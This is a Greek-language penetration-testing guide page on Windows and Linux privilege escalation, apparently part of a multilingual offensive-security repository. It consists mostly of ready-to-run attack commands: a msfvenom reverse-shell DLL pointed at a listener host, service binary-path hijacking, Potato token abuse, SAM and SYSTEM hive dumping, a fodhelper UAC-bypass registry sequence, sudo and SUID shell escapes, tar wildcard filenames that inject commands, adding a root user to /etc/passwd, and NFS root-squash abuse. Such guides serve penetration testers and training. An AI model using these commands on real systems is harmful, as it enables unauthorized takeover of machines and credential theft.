# ⬆️ Φάση 3: Κλιμάκωση προνομίων (Privilege Escalation)

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../03-Privilege-Escalation.md) • [🇮🇹 Italiano](03-Privilege-Escalation.it.md) • [🇹🇷 Türkçe](03-Privilege-Escalation.tr.md)

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**Στόχος:** Μετάβαση από τα δικαιώματα απλού χρήστη σε δικαιώματα Administrator/SYSTEM στα Windows ή root στο Linux.

> 📚 **Αναλυτικοί οδηγοί (στα αγγλικά):** [Κλιμάκωση προνομίων στα Windows](../../Windows-PrivEsc/translations/README.el.md) | [Κλιμάκωση προνομίων στο Linux](../../Linux-PrivEsc/translations/README.el.md)

---

## Πριν ξεκινήσετε

Η **κλιμάκωση προνομίων** είναι η απόκτηση περισσότερων δικαιωμάτων από όσα διαθέτει ο αρχικός λογαριασμός. Στα Windows συναντάμε τον **Administrator** και τον λογαριασμό υπηρεσιών **SYSTEM**, ενώ στο Linux τον **root**. Πρόκειται για διαφορετικές έννοιες και μηχανισμούς ανά λειτουργικό σύστημα.

**Βασικοί όροι:** Το **token** των Windows περιγράφει την ταυτότητα και τα δικαιώματα μιας διεργασίας. Το **Registry** αποθηκεύει ρυθμίσεις των Windows. Μια **DLL** είναι βιβλιοθήκη κώδικα. Στο Linux, το **sudo** επιτρέπει συγκεκριμένες εντολές με άλλη ταυτότητα, τα **SUID/SGID** επηρεάζουν την ταυτότητα εκτέλεσης αρχείων και τα **capabilities** αποδίδουν επιμέρους προνόμια.

Οι τεχνικές εξαρτώνται από ρυθμίσεις, δικαιώματα και συγκεκριμένες εκδόσεις. Τα εύρη εκδόσεων του πρωτοτύπου είναι ενδεικτικά και δεν λαμβάνουν απαραίτητα υπόψη διορθώσεις που έχει μεταφέρει η διανομή σε παλαιότερη έκδοση. Η παράκαμψη UAC δεν μετατρέπει γενικά οποιονδήποτε απλό χρήστη σε διαχειριστή.

## Περιεχόμενα

- [🖥️ Κλιμάκωση προνομίων στα Windows](#section-01)
- [🐧 Κλιμάκωση προνομίων στο Linux](#section-02)
- [📊 Γρήγορη αναφορά](#section-03)
- [🔗 Σχετικοί οδηγοί αναφοράς](#section-04)

<a id="section-01"></a>

## 🖥️ Κλιμάκωση προνομίων στα Windows

### Αρχικοί έλεγχοι για συνηθισμένες αδυναμίες
```cmd
# Έλεγχος τρεχόντων προνομίων
whoami /priv
whoami /groups

# Έλεγχος αποθηκευμένων στοιχείων σύνδεσης
cmdkey /list

# Αρχεία αυτοματοποιημένης εγκατάστασης
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Εκμετάλλευση αδυναμιών υπηρεσιών

#### Διαδρομή υπηρεσίας χωρίς εισαγωγικά (Unquoted Service Path)

Όταν μια διαδρομή υπηρεσίας περιέχει κενά χωρίς σωστά εισαγωγικά, η ερμηνεία της μπορεί να γίνει διαφορετικά από το αναμενόμενο. Η ύπαρξη μιας τέτοιας διαδρομής από μόνη της δεν αποδεικνύει δυνατότητα κλιμάκωσης προνομίων.

```cmd
# Εντοπισμός διαδρομών χωρίς εισαγωγικά
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Αν εντοπιστεί διαδρομή όπως: C:\Program Files\Some Service\service.exe
# Θέσεις εκτελέσιμου στο παράδειγμα: C:\Program.exe ή C:\Program Files\Some.exe
```

#### Ανεπαρκείς περιορισμοί δικαιωμάτων υπηρεσίας
```cmd
# Έλεγχος δικαιωμάτων υπηρεσιών με accesschk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Εφόσον επιτρέπεται η αλλαγή ρυθμίσεων υπηρεσίας (SERVICE_CHANGE_CONFIG):
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### Κατάχρηση της φόρτωσης βιβλιοθηκών (DLL Hijacking)
```powershell
# Εντοπισμός αναζητήσεων μη διαθέσιμων DLL με Process Monitor
# Τοποθέτηση της DLL του παραδείγματος στον κατάλογο υπηρεσίας
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Χρήση διακριτικού άλλου χρήστη (Token Impersonation)

Η διεργασία ενεργεί με το διακριτικό ταυτότητας άλλου λογαριασμού, εφόσον πληρούνται οι συγκεκριμένες προϋποθέσεις δικαιωμάτων και περιβάλλοντος.


#### Προνόμιο SeImpersonatePrivilege και τεχνικές Potato
```cmd
# Έλεγχος αν ο χρήστης διαθέτει SeImpersonatePrivilege
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 2012-2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7/Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

#### SeBackupPrivilege

Προνόμιο δημιουργίας αντιγράφων ασφαλείας των Windows. Ελέγχεται χωριστά από την απλή συμμετοχή ενός χρήστη σε μια ομάδα.

```powershell
# Εξαγωγή αντιγράφων SAM και SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Εξαγωγή συνόψεων κωδικών (hashes) στο σύστημα του ελεγκτή
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Εκμετάλλευση αδυναμιών στο μητρώο των Windows (Registry)
```cmd
# Ρυθμίσεις αυτόματης εκτέλεσης (AutoRun)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Έλεγχος διαδρομών προγραμματισμένων εργασιών για δυνατότητα εγγραφής
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# Δικαιώματα μητρώου των Windows
accesschk.exe -kvw hklm\SOFTWARE
```

### Παράκαμψη ελέγχου λογαριασμού χρήστη (UAC Bypass)
```powershell
# Παράδειγμα παράκαμψης μέσω fodhelper σε Windows 10
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### Αυτοματοποιημένα εργαλεία
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

<a id="section-02"></a>

## 🐧 Κλιμάκωση προνομίων στο Linux

### Αρχικοί έλεγχοι για συνηθισμένες αδυναμίες
```bash
# Επιτρεπόμενες εντολές μέσω sudo
sudo -l

# Εκτελέσιμα με ενεργό δικαίωμα SUID
find / -perm -4000 -type f 2>/dev/null

# Έλεγχος δυνατότητας εγγραφής στο /etc/passwd
ls -la /etc/passwd

# Έκδοση πυρήνα για έλεγχο γνωστών ευπαθειών
uname -a
```

### Εκμετάλλευση ρυθμίσεων ή ευπαθειών του sudo

#### Εκτέλεση sudo χωρίς κωδικό πρόσβασης
```bash
# Αν το sudo -l εμφανίζει: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# Αν το sudo -l εμφανίζει: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# Αν το sudo -l εμφανίζει: (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### Ευπάθεια έκδοσης του sudo (CVE-2021-3156)
```bash
# Έλεγχος έκδοσης sudo
sudo --version

# Έλεγχος παλαιών εκδόσεων sudo — τα όρια του πρωτοτύπου είναι ενδεικτικά, όχι πλήρης έλεγχος ευπάθειας
# Πηγή παραδείγματος: https://github.com/blasty/CVE-2021-3156
```

### Εκτελέσιμα με ειδικά δικαιώματα SUID/SGID
```bash
# Εντοπισμός εκτελέσιμων με SUID
find / -perm -4000 -type f 2>/dev/null

# Αναφορά στις σχετικές καταχωρίσεις του GTFOBins
# https://gtfobins.github.io/

# Παράδειγμα: SUID στο /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit

# Παράδειγμα: SUID στο /usr/bin/vim
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Παράδειγμα: SUID στο /usr/bin/python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Επιμέρους προνόμια εκτελέσιμων (Capabilities)

Τα capabilities χωρίζουν ορισμένες ισχυρές δυνατότητες του root σε επιμέρους προνόμια. Εξετάζουμε ποια έχουν αποδοθεί σε κάθε εκτελέσιμο.

```bash
# Εντοπισμός εκτελέσιμων με επιμέρους προνόμια (Capabilities)
getcap -r / 2>/dev/null

# Παράδειγμα: προνόμιο cap_setuid στην Python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Προγραμματισμένες εργασίες (Cron Jobs)
```bash
# Έλεγχος προγραμματισμένων εργασιών cron
cat /etc/crontab
ls -la /etc/cron.*

# Αναζήτηση σεναρίων στα οποία επιτρέπεται εγγραφή
# Παράδειγμα κατάχρησης χαρακτήρων μπαλαντέρ κατά την εκτέλεση tar:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

### Κατάχρηση της διαδρομής αναζήτησης εντολών (PATH Hijacking)
```bash
# Αν μια εργασία cron ή ένα σενάριο καλεί εντολή χωρίς πλήρη διαδρομή
# Παράδειγμα εκτελέσιμου σε εγγράψιμο κατάλογο της PATH

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### Δυνατότητα εγγραφής στο /etc/passwd
```bash
# Αν επιτρέπεται εγγραφή στο /etc/passwd
# Παραγωγή σύνοψης κωδικού (hash)
openssl passwd -1 -salt evil password123

# Παράδειγμα προσθήκης χρήστη με δικαιώματα root
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# Μετάβαση στον νέο λογαριασμό root του παραδείγματος
su evil
```

### Εκμετάλλευση ευπαθειών του πυρήνα (Kernel)
```bash
# Έλεγχος έκδοσης πυρήνα
uname -r
cat /proc/version

# Αναζήτηση παραδειγμάτων εκμετάλλευσης
searchsploit linux kernel 4.4 privilege escalation

# Γνωστά παραδείγματα ευπαθειών πυρήνα — οι εκδόσεις απαιτούν ξεχωριστή επαλήθευση:
# - DirtyCow (CVE-2016-5195) — ενδεικτικό εύρος πυρήνα του πρωτοτύπου: 2.x–4.x
# - DirtyPipe (CVE-2022-0847) — ενδεικτικό εύρος πυρήνα του πρωτοτύπου: 5.8–5.16.11
```

### Εκμετάλλευση ρυθμίσεων κοινής χρήσης NFS
```bash
# Έλεγχος ρύθμισης no_root_squash
showmount -e 192.168.1.10
cat /etc/exports

# Αν έχει οριστεί no_root_squash:
# Παράδειγμα προσάρτησης κοινόχρηστου πόρου και δημιουργίας εκτελέσιμου SUID ως root
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# Στο σύστημα-στόχο:
/mnt/bash -p
```

### Αυτοματοποιημένα εργαλεία
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration (LSE)
./lse.sh -l 2
```

---

<a id="section-03"></a>

## 📊 Γρήγορη αναφορά

### Λίστα ελέγχου Windows
```markdown
- [ ] whoami /priv — έλεγχος SeImpersonate, SeBackup και άλλων προνομίων
- [ ] Διαδρομές υπηρεσιών χωρίς εισαγωγικά
- [ ] Ανεπαρκείς περιορισμοί δικαιωμάτων υπηρεσιών
- [ ] AlwaysInstallElevated
- [ ] Αποθηκευμένα στοιχεία σύνδεσης (cmdkey /list)
- [ ] Αρχεία αυτοματοποιημένης εγκατάστασης Unattend/Sysprep
- [ ] Προγραμματισμένες εργασίες
- [ ] Έλεγχος με WinPEAS/PowerUp
```

### Λίστα ελέγχου Linux
```markdown
- [ ] sudo -l
- [ ] Εκτελέσιμα SUID — έλεγχος των σχετικών εγγραφών στο GTFOBins
- [ ] Επιμέρους προνόμια εκτελέσιμων (Capabilities)
- [ ] Εργασίες cron — εγγράψιμα σενάρια και χαρακτήρες μπαλαντέρ
- [ ] Δυνατότητα εγγραφής στο /etc/passwd
- [ ] Έκδοση πυρήνα και σχετικές ευπάθειες
- [ ] NFS no_root_squash
- [ ] Έλεγχος με LinPEAS
```

---

<a id="section-04"></a>

## 🔗 Σχετικοί οδηγοί αναφοράς

- [Κλιμάκωση προνομίων Windows — αναλυτικά](../../Windows-PrivEsc/translations/README.el.md)
- [Κλιμάκωση προνομίων Linux — αναλυτικά](../../Linux-PrivEsc/translations/README.el.md)
- [Mimikatz](../../Mimikatz/translations/README.el.md)

---

**Προηγούμενη φάση:** [← 02 — Αναγνώριση και απαρίθμηση](02-Enumeration.el.md)

**Επόμενη φάση:** [04 — Πλευρική μετακίνηση →](04-Lateral-Movement.el.md)

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
